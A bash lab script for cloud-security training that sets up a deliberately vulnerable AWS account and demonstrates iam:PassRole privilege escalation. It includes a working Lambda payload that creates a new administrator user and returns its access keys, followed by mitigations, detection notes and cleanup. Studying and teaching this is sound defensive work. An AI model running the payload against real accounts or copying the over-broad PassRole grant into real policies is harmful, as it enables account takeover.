#!/usr/bin/env bash
# Lab: IAM privilege escalation via iam:PassRole
# Objective: Show how a user with limited IAM but iam:PassRole + lambda:CreateFunction
#   can escalate to admin by passing an admin role to a Lambda function they create.
#
# What an interviewer will ask:
#   1. "If a developer has iam:PassRole and lambda:CreateFunction, what can they do?"
#   2. "How do you stop iam:PassRole privilege escalation?"
#   3. "What is the difference between iam:PassRole and sts:AssumeRole?"
#
# Reference attack pattern: Rhino Security Labs "AWS IAM Privilege Escalation"
#   https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
#
# This lab uses real AWS. Pick a sandbox account. Cleanup at the end.

set -euo pipefail

REGION="${AWS_REGION:-us-east-1}"
PROFILE="${AWS_PROFILE:-default}"
PREFIX="lab-passrole-$(date +%s)"
LOW_USER="${PREFIX}-dev"
ADMIN_ROLE="${PREFIX}-admin-role"
LAMBDA_NAME="${PREFIX}-fn"
ROLE_TRUST_FILE="/tmp/${PREFIX}-trust.json"
LAMBDA_ZIP="/tmp/${PREFIX}-fn.zip"
LAMBDA_SRC_DIR="/tmp/${PREFIX}-src"

aws_cli() { aws --profile "$PROFILE" --region "$REGION" "$@"; }

echo "=== STEP 1: build the vulnerable setup ==="

# Trust policy: Lambda service can assume the admin role.
cat > "$ROLE_TRUST_FILE" <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Service": "lambda.amazonaws.com"},
    "Action": "sts:AssumeRole"
  }]
}
EOF

# Create the admin role (the one that will be passed)
aws_cli iam create-role \
  --role-name "$ADMIN_ROLE" \
  --assume-role-policy-document "file://$ROLE_TRUST_FILE" >/dev/null

aws_cli iam attach-role-policy \
  --role-name "$ADMIN_ROLE" \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create the low-priv user with the dangerous combination
aws_cli iam create-user --user-name "$LOW_USER" >/dev/null

# Identity policy: only iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
cat > /tmp/${PREFIX}-userpol.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {"Effect": "Allow", "Action": ["lambda:CreateFunction", "lambda:InvokeFunction", "lambda:GetFunction"], "Resource": "*"},
    {"Effect": "Allow", "Action": "iam:PassRole", "Resource": "arn:aws:iam::*:role/${ADMIN_ROLE}"}
  ]
}
EOF

aws_cli iam put-user-policy \
  --user-name "$LOW_USER" \
  --policy-name "lab-passrole-vuln" \
  --policy-document "file:///tmp/${PREFIX}-userpol.json"

ACCESS=$(aws_cli iam create-access-key --user-name "$LOW_USER" --query 'AccessKey.[AccessKeyId,SecretAccessKey]' --output text)
AKID=$(echo "$ACCESS" | awk '{print $1}')
SKID=$(echo "$ACCESS" | awk '{print $2}')

echo "Created vulnerable user $LOW_USER with access key $AKID"
echo "Wait 10 seconds for IAM consistency"
sleep 10

echo
echo "=== STEP 2: exploit ==="

# Build a tiny Lambda that creates a new IAM admin user. This is the payload.
mkdir -p "$LAMBDA_SRC_DIR"
cat > "$LAMBDA_SRC_DIR/index.py" <<'EOF'
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.create_user(UserName=event['user'])
    iam.attach_user_policy(
        UserName=event['user'],
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    keys = iam.create_access_key(UserName=event['user'])
    return {
        'AccessKeyId': keys['AccessKey']['AccessKeyId'],
        'SecretAccessKey': keys['AccessKey']['SecretAccessKey']
    }
EOF
(cd "$LAMBDA_SRC_DIR" && zip -q "$LAMBDA_ZIP" index.py)

ACCOUNT_ID=$(aws_cli sts get-caller-identity --query Account --output text)

# Now pivot to the low-priv user creds and create the Lambda passing the admin role
echo "Switching to low-priv credentials"
AWS_ACCESS_KEY_ID="$AKID" AWS_SECRET_ACCESS_KEY="$SKID" AWS_DEFAULT_REGION="$REGION" \
  aws lambda create-function \
    --function-name "$LAMBDA_NAME" \
    --runtime python3.12 \
    --role "arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}" \
    --handler index.handler \
    --zip-file "fileb://$LAMBDA_ZIP" >/dev/null

echo "Lambda created with admin role. Invoking it to mint a new admin user."
sleep 5

AWS_ACCESS_KEY_ID="$AKID" AWS_SECRET_ACCESS_KEY="$SKID" AWS_DEFAULT_REGION="$REGION" \
  aws lambda invoke \
    --function-name "$LAMBDA_NAME" \
    --payload "$(printf '{"user": "%s-pwned"}' "$PREFIX" | base64)" \
    /tmp/${PREFIX}-out.json >/dev/null

echo "Result of Lambda execution:"
cat /tmp/${PREFIX}-out.json
echo
echo "If you see AccessKeyId in that output, the low-priv user just minted admin creds."
echo "That is the privilege escalation. Total IAM permissions used: PassRole + Lambda."

echo
echo "=== STEP 3: the fix ==="
cat <<'FIX'

FIX OPTIONS, in order of strength:

1. NEVER grant iam:PassRole on a wildcard or on admin roles to non-admin users.
   The vulnerable policy had: Resource: "arn:aws:iam::*:role/<admin-role>"
   Fix: scope iam:PassRole to a *specific list of safe-to-pass roles*. None of those
   roles should have admin or wildcard write permissions.

2. Add iam:PassedToService condition to constrain *which service* the role can be passed to.
   Example: allow PassRole only when iam:PassedToService = ec2.amazonaws.com.
   {
     "Effect": "Allow",
     "Action": "iam:PassRole",
     "Resource": "arn:aws:iam::*:role/safe-ec2-role",
     "Condition": {"StringEquals": {"iam:PassedToService": "ec2.amazonaws.com"}}
   }

3. Use a permission boundary on the user. Even if their identity policy is loose,
   the boundary caps what they can do. If the boundary forbids lambda:CreateFunction
   with an admin role, the privesc fails.

4. SCP at the org level: deny iam:PassRole on any role tagged sensitivity=high
   for any principal not in the SecurityAdmins group.

5. Detection: GuardDuty IAM finding "Privilege escalation". CloudTrail event
   CreateFunction with role admin + new principal. Wire to SecurityHub.

Real-world references:
- Rhino Security Labs catalogued 21+ IAM privesc paths. PassRole is the most common.
- AWS docs on PassRole: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html
- Pacu open-source pentest toolkit (iam__privesc_scan module) automates this.

FIX

echo
echo "=== STEP 4: cleanup ==="
read -r -p "Press enter to clean up the lab (this deletes the user, role, lambda, keys)... "

aws_cli lambda delete-function --function-name "$LAMBDA_NAME" || true
aws_cli iam delete-user-policy --user-name "$LOW_USER" --policy-name "lab-passrole-vuln" || true
aws_cli iam delete-access-key --user-name "$LOW_USER" --access-key-id "$AKID" || true
aws_cli iam delete-user --user-name "$LOW_USER" || true
aws_cli iam delete-user --user-name "${PREFIX}-pwned" 2>/dev/null || true
# detach + delete the role
aws_cli iam detach-role-policy --role-name "$ADMIN_ROLE" --policy-arn arn:aws:iam::aws:policy/AdministratorAccess || true
aws_cli iam delete-role --role-name "$ADMIN_ROLE" || true
rm -f "$ROLE_TRUST_FILE" "$LAMBDA_ZIP" /tmp/${PREFIX}-userpol.json /tmp/${PREFIX}-out.json
rm -rf "$LAMBDA_SRC_DIR"

echo "Cleanup complete."
